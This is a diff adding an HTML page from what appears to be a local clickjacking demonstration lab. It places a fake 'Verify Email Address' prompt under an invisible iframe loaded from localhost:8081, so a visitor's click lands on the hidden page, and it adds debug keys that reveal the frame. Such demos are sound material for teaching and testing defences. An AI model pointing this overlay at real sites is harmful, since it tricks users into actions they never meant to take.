@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Attack 2: Button Hijacking</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: #f5f5f5;
+        }
+        .info-banner {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: #dc3545;
+            color: white;
+            padding: 15px;
+            text-align: center;
+            z-index: 1000;
+            font-size: 14px;
+        }
+        .back-link {
+            position: fixed;
+            top: 60px;
+            left: 20px;
+            background: white;
+            padding: 10px 20px;
+            border-radius: 6px;
+            text-decoration: none;
+            color: #667eea;
+            font-weight: bold;
+            z-index: 1001;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .container {
+            margin-top: 100px;
+            max-width: 1200px;
+            margin-left: auto;
+            margin-right: auto;
+            padding: 20px;
+            position: relative;
+        }
+        #decoy-content {
+            background: white;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            position: relative;
+            z-index: 1;
+        }
+        #decoy-content h1 {
+            color: #667eea;
+            margin-bottom: 20px;
+        }
+        #decoy-content .warning {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        .action-button {
+            background: #28a745;
+            color: white;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 10px 5px;
+        }
+        #victim-iframe {
+            position: absolute;
+            top: 310px;
+            left: 60px;
+            width: 800px;
+            height: 500px;
+            border: none;
+            opacity: 0;
+            z-index: 2;
+            pointer-events: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="info-banner">
+        ATTACK 2: Button Hijacking | Press 'D' to toggle visibility, 'B' for border
+    </div>
+
+    <a href="index.html" class="back-link">Back</a>
+
+    <div class="container">
+        <div id="decoy-content">
+            <h1>Complete Your Profile Update</h1>
+            
+            <div class="warning">
+                <strong>Action Required:</strong> Please verify your email address to continue.
+            </div>
+
+            <p>To complete your profile update and unlock premium features, click the button below:</p>
+
+            <button class="action-button">Verify Email Address</button>
+
+            <p style="color: #666; font-size: 14px; margin-top: 20px;">
+                This is a one-time verification process.
+            </p>
+        </div>
+
+        <iframe id="victim-iframe" src="http://localhost:8081"></iframe>
+    </div>
+
+    <script>
+        let showingIframe = false;
+        let showingBorder = false;
+        const iframe = document.getElementById('victim-iframe');
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'd' || e.key === 'D') {
+                showingIframe = !showingIframe;
+                iframe.style.opacity = showingIframe ? '0.5' : '0';
+            }
+            if (e.key === 'b' || e.key === 'B') {
+                showingBorder = !showingBorder;
+                iframe.style.border = showingBorder ? '3px solid red' : 'none';
+            }
+        });
+
+        console.log('Debug keys: D=toggle visibility, B=toggle border');
+    </script>
+</body>
+</html>
